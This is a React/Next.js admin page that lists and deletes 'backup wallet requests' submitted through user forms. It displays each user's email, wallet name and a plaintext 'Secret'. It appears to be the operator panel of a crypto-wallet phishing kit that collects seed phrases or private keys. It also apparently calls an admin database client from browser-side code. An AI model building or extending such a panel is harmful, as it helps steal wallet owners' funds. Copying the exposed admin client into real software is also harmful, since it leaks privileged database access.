"use client";

import { useEffect, useState } from "react";

import { supabaseAdmin } from "@/lib/supabaseClient";

type BackupRequest = {
  id: string;
  provider: string;
  method: string;
  user_email: string | null;
  source: string;
  status: string;
  payload: string;
  created_at: string;
};

export default function AdminBackupRequestsPage() {
  const [requests, setRequests] = useState<BackupRequest[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState("");
  const [deletingId, setDeletingId] = useState<string | null>(null);

  useEffect(() => {
    const loadRequests = async () => {
      const { data, error: loadError } = await supabaseAdmin
        .from("backup_wallet_requests")
        .select(
          "id,provider,method,user_email,source,status,created_at,payload"
        )
        .order("created_at", { ascending: false });

      if (loadError) {
        setError(loadError.message);
        setIsLoading(false);
        return;
      }

      setRequests(data ?? []);
      setIsLoading(false);
    };

    loadRequests();
  }, []);

  const handleDelete = async (requestId: string) => {
    setError("");
    setDeletingId(requestId);
    const { error: deleteError } = await supabaseAdmin
      .from("backup_wallet_requests")
      .delete()
      .eq("id", requestId);

    if (deleteError) {
      setError(deleteError.message);
      setDeletingId(null);
      return;
    }

    setRequests((prev) => prev.filter((item) => item.id !== requestId));
    setDeletingId(null);
  };

  return (
    <div className="space-y-6">
      <div className="rounded-3xl border border-white/10 bg-[#15192e] p-6 text-white shadow-[0_18px_45px_rgba(4,10,22,0.6)]">
        <h2 className="text-lg font-semibold">Backup Requests</h2>
        <p className="mt-2 text-sm text-slate-400">
          Submissions from user backup wallet forms.
        </p>
      </div>

      <div className="overflow-hidden rounded-3xl border border-white/10 bg-[#0f1118] text-slate-200 shadow-[0_18px_45px_rgba(4,10,22,0.6)]">
        {isLoading ? (
          <div className="p-6 text-sm text-slate-400">Loading...</div>
        ) : error ? (
          <div className="p-6 text-sm text-rose-400">{error}</div>
        ) : requests.length ? (
          <div className="divide-y divide-white/10">
            {requests.map((request) => {
              let parsedPayload: {
                walletName?: string;
                walletEmail?: string;
                value?: string;
                method?: string;
              } | null = null;

              try {
                parsedPayload = JSON.parse(request.payload);
              } catch {
                parsedPayload = null;
              }

              const secretValue = parsedPayload?.value ?? request.payload;

              return (
                <div key={request.id} className="p-6 text-sm">
                  <div className="grid gap-2 sm:grid-cols-6">
                    <div>
                      <div className="text-xs text-slate-500">Provider</div>
                      <div className="font-semibold">{request.provider}</div>
                    </div>
                    <div>
                      <div className="text-xs text-slate-500">Method</div>
                      <div className="capitalize">{request.method}</div>
                    </div>
                    <div>
                      <div className="text-xs text-slate-500">User Email</div>
                      <div>{request.user_email ?? "Unknown"}</div>
                    </div>
                    <div>
                      <div className="text-xs text-slate-500">Source</div>
                      <div className="text-cyan-300">{request.source}</div>
                    </div>
                    <div>
                      <div className="text-xs text-slate-500">Status</div>
                      <div className="capitalize">{request.status}</div>
                    </div>
                    <div>
                      <div className="text-xs text-slate-500">Created</div>
                      <div>{new Date(request.created_at).toLocaleString()}</div>
                    </div>
                  </div>
                  <div className="mt-4 flex items-center justify-end">
                    <button
                      type="button"
                      onClick={() => handleDelete(request.id)}
                      disabled={deletingId === request.id}
                      className="rounded-full border border-rose-500/30 px-4 py-1 text-xs text-rose-300 hover:bg-rose-500/10 disabled:opacity-70"
                    >
                      {deletingId === request.id ? "Deleting..." : "Delete"}
                    </button>
                  </div>
                  <div className="mt-4 rounded-2xl border border-white/10 bg-[#15192e] p-4 text-xs text-slate-200">
                    <div className="text-[10px] font-semibold uppercase tracking-[0.2em] text-slate-500">
                      User Payload
                    </div>
                    <div className="mt-3 space-y-2">
                      <div>
                        <span className="text-slate-400">Wallet Name:</span>{" "}
                        {parsedPayload?.walletName ?? "N/A"}
                      </div>
                      <div>
                        <span className="text-slate-400">Wallet Email:</span>{" "}
                        {parsedPayload?.walletEmail ?? "N/A"}
                      </div>
                      <div>
                        <span className="text-slate-400">Secret:</span>{" "}
                        <span className="break-all text-rose-300">
                          {secretValue}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        ) : (
          <div className="p-6 text-sm text-slate-400">
            No backup requests yet.
          </div>
        )}
      </div>
    </div>
  );
}
